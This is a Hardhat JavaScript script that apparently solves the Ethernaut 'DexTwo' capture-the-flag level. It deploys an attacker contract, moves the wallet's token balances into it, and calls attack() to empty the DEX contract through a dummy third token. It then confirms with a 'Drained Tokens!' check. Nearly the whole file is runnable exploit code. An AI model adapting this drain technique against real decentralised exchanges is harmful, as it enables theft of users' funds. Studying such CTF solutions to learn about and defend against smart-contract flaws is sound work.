const { expect } = require("chai")
const { Wallet } = require("ethers")
const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")
require("dotenv").config()

async function main() {
    await resetNode()
    let token1, token2, token1bal, token2bal, token3bal, tx, res
    let attacker = new Wallet(process.env.METAMASK_PRIVATE_KEY, ethers.provider)
    let instanceAddress = "0xEC2fe3235e0685B493522c4019399a1582f17795"
    let target = await ethers.getContractAt("DexTwo", instanceAddress, attacker)
    let attackerContractFactory = await ethers.getContractFactory(
        "DexTwoAttacker"
    )
    let attackerContract = await attackerContractFactory.deploy(instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker Contract deployed at ${attackerContract.address}`)

    token1 = await target.token1()
    token2 = await target.token2()

    const getbal = async (targetAdd, printBool) => {
        token1bal = parseInt(await target.balanceOf(token1, targetAdd))
        token2bal = parseInt(await target.balanceOf(token2, targetAdd))
        if (printBool) {
            console.log(`Balance of ${targetAdd}:`)
            console.log(`Token 1: ${token1bal}`)
            console.log(`Token 2: ${token2bal}`)
        }
    }

    // Attack
    await getbal(attacker.address, true)
    let token1Contract = await ethers.getContractAt(
        "SwappableToken",
        token1,
        attacker
    )
    let token2Contract = await ethers.getContractAt(
        "SwappableToken",
        token2,
        attacker
    )
    tx = await token1Contract.transfer(attackerContract.address, token1bal)
    tx = await token2Contract.transfer(attackerContract.address, token2bal)
    await tx.wait(1)

    await getbal(target.address, false)
    tx = await attackerContract.attack(token1bal, token2bal)
    await tx.wait(1)
    token3 = await attackerContract.token3()
    token3bal = await attackerContract.token3Bal(target.address)
    console.log(`Dummy coins in DEX: ${token3bal}`)
    await getbal(attackerContract.address, true)

    // let rate = await target.getSwapAmount(token3, token1, 100)
    // console.log(`Can swap 100 token1 for ${rate} token3`)

    // Check
    await getbal(target.address, true)
    if (token1bal == 0 && token2bal == 0) {
        console.log(`${symbols.success} Drained Tokens!`)
    } else {
        console.log(`${symbols.error} Some tokens still present!`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
